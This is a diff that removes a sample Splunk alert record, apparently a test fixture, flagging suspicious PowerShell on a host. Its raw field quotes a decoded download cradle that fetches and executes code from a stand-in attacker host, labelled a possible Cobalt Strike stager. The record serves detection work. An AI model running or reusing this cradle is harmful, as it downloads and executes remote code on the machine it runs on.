@@ -1,9 +1,0 @@
-{
-  "id": "SPLK-1002",
-  "timestamp": "2026-03-04T06:30:00",
-  "subsystem": "splunk",
-  "type": "alert",
-  "alert_name": "Suspicious PowerShell Execution",
-  "severity": "medium",
-  "raw": "Host: APP-SRV-14. Process: powershell.exe -enc <base64>. Decoded: IEX (New-Object Net.WebClient).DownloadString('http://evil-c2.example.com/a'). Indicator: PowerShell download cradle. Possible Cobalt Strike stager."
-}
